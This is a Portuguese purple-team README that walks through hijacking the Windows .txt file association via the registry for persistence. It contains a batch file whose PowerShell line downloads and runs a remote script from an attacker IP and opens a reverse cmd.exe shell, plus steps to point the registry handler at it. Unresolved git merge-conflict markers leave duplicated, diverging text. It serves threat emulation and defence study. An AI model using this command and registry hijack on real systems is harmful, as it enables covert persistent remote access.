
<p align="center">
  <img src="./imagens/ISHLOGO.png" alt="Logo do Purple Team" width="300" height="300">
</p>

# CTI Purple Team - Execução Acionada por Evento: Alterar Associação de Arquivo Padrão 

<<<<<<< HEAD
Quando um arquivo é criado em um sistema operacional como o Windows, ele é automaticamente associado a um programa específico que será usado para abrir esse tipo de arquivo quando clicado duas vezes.

A execução acionada por evento permite que os usuários personalizem a maneira como os arquivos são abertos, definindo regras específicas para acionar a execução de aplicativos diferentes com base em diferentes eventos.

As seleções de associação de arquivos são armazenados no Registro do Windows e podem ser editados por usuários, administradores ou programas que tenham acesso ao Registro ou por administradores usando o utilitário associado.

Neste contexto, exploraremos os conceitos por trás da execução acionada por evento representando o sequestro da extenção ***.txt***, sendo possível executar um aplicativo malicioso antes que o arquivo real seja aberto, gerando um reverse shell na máquina do atacante.

## Contexto

Quando um arquivo ***.txt*** é clicado duas vezes, ele é aberto com um ***notepad.exe***. O windows por padrão sabe que para abrir esse tipo de extensão precisa usar o *notepad.exe*.

As associaçõs de arquivos do sistemas estão listadas em **HKEY_CLASSES_ROOT.[extention]**, no caso dessa pesquisa será listado em **HKEY_CLASSES_ROOT.txt**.

No entanto, é possível sequestrar chaves de registro que controlam o programa padrão para extensões específicas a fim de obter persistência.
=======
Quando um arquivo é criado em um sistema operacional como o Windows, ele é automaticamente associado a um programa específico que será usado para abrir esse tipo de arquivo quando clicado duas vezes. A execução acionada por evento permite que os usuários personalizem a maneira como os arquivos são abertos, definindo regras específicas para acionar a execução de aplicativos diferentes com base em diferentes eventos.

Neste contexto, exploraremos os conceitos por trás da execução acionada por evento representando o sequestro da extenção ***.txt***, sendo possível executar um aplicativo malicioso antes que o arquivo real seja aberto, gerando um reverse shell na máquina do atacante, a fim de obter persistência.

<p align="center">
  <img src="imagens/Fluxograma_ServiceExecution.png">
</p>

**A priori, para executar o sequestro de extensão, é importante salientar que o atacante já possua o primeiro acesso inicial à máquina alvo, com privilégios administrativos. Portando, já ter realizado a Execução e Escalação de Privilégios na vítima**.

## Contexto

Ao clicar duas vzes em um arquivo ***.txt***, ele é aberto com um ***notepad.exe***. O windows por padrão sabe que para abrir esse tipo de extensão precisa usar o *notepad.exe*.
>>>>>>> 01b2a00758a898126d20308d17ca269ef93a7549

As seleções de associação de arquivos são armazenados no Registro do Windows e estão listadas em **HKEY_CLASSES_ROOT.[extention]**, no caso dessa pesquisa será listado em **HKEY_CLASSES_ROOT.txt** e, podem ser editados por usuários, administradores ou programas que tenham acesso ao Registro ou por administradores usando o utilitário associado, desde que tenham elevação de privilégio de administrador. 

<<<<<<< HEAD
## Análise e Execução do código malicioso
=======
## Emulação de Ameaça - Criação de Arquivo Malicioso Através do ps.exe
>>>>>>> 01b2a00758a898126d20308d17ca269ef93a7549

Há dois locais de registro que definem os manipuladores de extensão, que são mostrados a seguir, e são classificados como: *Global* e *Local*.

<p align="center">
  <img src="imagens/locais-de-registro.png">
</p>

Quando um usuário tenta abrir um arquivo, o sistema operacional verifica os registros locais em (HKEY_CURRENT_USERS) para determinar qual programa está designado para lidar com aquela extensão de arquivo. Caso nao houver nenhuma entrada de registro associada, a verificação é feita na árvore de registro global (HKEY_CLASSES_ROOT).

Dependendo dos privilégios do usuário (Administrador ou Usuário Padrão), esses locais de registro podem ser explorados para executar código malicioso, utilizando o manipulador de extensão como um gatilho.

<<<<<<< HEAD
A priori, para executar o sequestro de extensão é necessário que o atacante já possua o primeiro acesso inicial à máquina alvo.

Portanto, podemos observar que o manipulador de extensão ***.txt*** está definido na chave de registro abaixo:

Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command ---- [***colocar botao de copiar***]

Abaixo exemplifico que o comando responsável por abrir arquivos *.txt* é o *notepad.exe %1*, onde o argumento *%1*, especifica um nome de arquivo qualquer, ou seja, é uma variante para o nome dos arquivos que o bloco de notas deve abrir:

<p align="center">
  <img src="imagens/Editor-de-registro-HKEY.png">
</p>

Supomos que o usuário alvo possua uma arquivo chamado ***test.txt*** em sua área de trabalho, contendo o conteúdo do arquivo ilustrado abaixo:

<p align="center">
  <img src="imagens/arquivo-vitima.png">
</p>

Iremos criar agora um arquivo malicioso que será executado quando o usuário alvo tentar abrir um arquivo chamado test.txt, sendo que com a execução desta têcnica pode ser qualquer arquivo aleatório, apenas seguindo o critério de extenção .txt usado como exemplo nesta pesquisa.

Para isso, criaremos um arquivo em lotes simples do Windows chamado ***shell.cmd*** na maquina do usuário alvo:

start notepad.exe %1
powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.140.128/purplecat.ps1');purplecat -c 192.168.140.128 -p 8081 -e cmd.exe"  ------- ***COLOCAR BOTAO DE COLAR***

A partir disso, podemos sequestrar a extensão do arquivo .txt, modificando os dados do valor de registro de: Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command para C:\Users\Win-test\Desktop\shell.cmd, local onde nosso arquivo malicioso está gravado.

<p align="center">
  <img src="imagens/mod.registro.png">
</p>

Após a modificação a chave de registro se encontrará da mesma maneira que a imagem abaixo:

<p align="center">
  <img src="imagens/modificado.png">
</p>
